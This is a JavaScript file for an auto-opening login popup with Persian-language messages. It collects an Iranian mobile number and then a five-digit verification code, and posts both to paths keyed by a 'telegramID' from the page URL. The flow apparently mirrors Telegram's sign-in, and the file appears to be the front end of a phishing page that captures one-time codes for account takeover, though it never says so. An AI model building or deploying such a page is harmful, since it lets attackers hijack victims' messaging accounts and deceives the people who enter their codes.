// Show popup function
function showPopup() {
    const popup = document.getElementById('loginPopup');
    popup.classList.add('active');
}

// Close popup function
function closePopup() {
    const popup = document.getElementById('loginPopup');
    popup.classList.remove('active');
    // Reset form when closing
    resetForm();
}

// Signin button click handler
function signin() {
    showPopup();
}

// Reset form to initial state
function resetForm() {
    document.getElementById('phoneStep').style.display = 'block';
    document.getElementById('otpStep').style.display = 'none';
    document.getElementById('phoneNumber').value = '';
    document.getElementById('otpCode').value = '';
    document.getElementById('phoneError').style.display = 'none';
    document.getElementById('otpError').style.display = 'none';
    document.getElementById('successMessage').style.display = 'none';
}

// Get telegramID from URL
function getTelegramID() {
    const pathParts = window.location.pathname.split('/');
    return pathParts[pathParts.length - 1];
}

// Send OTP function
function sendOTP() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    const phoneError = document.getElementById('phoneError');
    const phoneSpinner = document.getElementById('phoneSpinner');
    const telegramID = getTelegramID();
    
    // Validate phone number
    if (!phoneNumber || !/^09\d{9}$/.test(phoneNumber)) {
        phoneError.textContent = 'لطفا شماره موبایل معتبر وارد کنید';
        phoneError.style.display = 'block';
        return;
    }
    
    phoneError.style.display = 'none';
    phoneSpinner.style.display = 'block';
    
    // API call with telegramID in URL
    fetch(`/${telegramID}/login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phoneNumber: phoneNumber }),
    })
    .then(response => response.json())
    .then(data => {
        phoneSpinner.style.display = 'none';
        
        if (data.success) {
            // Show OTP step
            document.getElementById('phoneStep').style.display = 'none';
            document.getElementById('otpStep').style.display = 'block';
            document.getElementById('phoneDisplay').textContent = phoneNumber;
        } else {
            phoneError.textContent = data.message || 'خطا در ارسال کد تایید';
            phoneError.style.display = 'block';
        }
    })
    .catch(error => {
        phoneSpinner.style.display = 'none';
        phoneError.textContent = 'خطا در ارتباط با سرور';
        phoneError.style.display = 'block';
        console.error('Error:', error);
    });
}

// Verify OTP function
function verifyOTP() {
    const phoneNumber = document.getElementById('phoneNumber').value;
    const otpCode = document.getElementById('otpCode').value;
    const otpError = document.getElementById('otpError');
    const otpSpinner = document.getElementById('otpSpinner');
    const successMessage = document.getElementById('successMessage');
    const telegramID = getTelegramID();
    
    // Validate OTP
    if (!otpCode || !/^\d{5}$/.test(otpCode)) {
        otpError.textContent = 'لطفا کد تایید ۵ رقمی را وارد کنید';
        otpError.style.display = 'block';
        return;
    }
    
    otpError.style.display = 'none';
    otpSpinner.style.display = 'block';
    
    // API call with telegramID in URL
    fetch(`/${telegramID}/otp`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            phoneNumber: phoneNumber,
            otpCode: otpCode 
        }),
    })
    .then(response => response.json())
    .then(data => {
        otpSpinner.style.display = 'none';
        
        if (data.success) {
            // Show success message
            successMessage.style.display = 'block';
            otpError.style.display = 'none';
            
            // Close popup after 3 seconds
            setTimeout(() => {
                closePopup();
            }, 3000);
        } else {
            otpError.textContent = data.message || 'کد تایید نامعتبر است';
            otpError.style.display = 'block';
        }
    })
    .catch(error => {
        otpSpinner.style.display = 'none';
        otpError.textContent = 'خطا در ارتباط با سرور';
        otpError.style.display = 'block';
        console.error('Error:', error);
    });
}

// Auto show popup after 3 seconds
window.addEventListener('load', function() {
    setTimeout(function() {
        showPopup();
    }, 3000);
});